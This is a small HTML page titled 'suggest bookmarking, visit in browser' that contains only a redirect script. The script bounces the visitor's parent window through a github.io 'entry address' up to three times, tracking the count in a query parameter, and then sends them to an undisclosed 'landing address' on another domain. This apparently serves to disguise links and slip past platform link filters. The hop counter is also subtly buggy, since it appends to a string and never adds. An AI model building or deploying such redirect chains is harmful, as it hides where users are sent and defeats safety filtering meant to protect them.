<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>建议收藏，浏览器访问。</title>
	</head>
	<body>
		<script>
	var fid = getQueryVariable('fid');
	var t = getQueryVariable('t');
	var dz;
	function getQueryVariable(variable) {
		var query = window.location.search.substring(1);
		var vars = query.split("&");
		for (var i = 0; i < vars.length; i++) {
			var pair = vars[i].split("=");
			if (pair[0] == variable) {
				return pair[1];
			}
		}
		return (false);
	}
	const timestamp = +new Date();
	// 入口地址
	let shu = ['https://ludelink.github.io/ztcc.html'];
	// 落地地址
	let luodi = ['http://miao.chou3.cn'];
	var i = Math.floor((Math.random() * shu.length));
	var j = Math.floor((Math.random() * luodi.length));
	if(t<3){
		t=t+1;
		dz=shu[i]+'/?_wv=1027&t='+t+'&fid='+fid;
		parent.location.href = dz;
	}else{
		dz=luodi[j]+'/?fid='+fid;
		parent.location.href = dz;
	}

	
</script>
	</body>
</html>
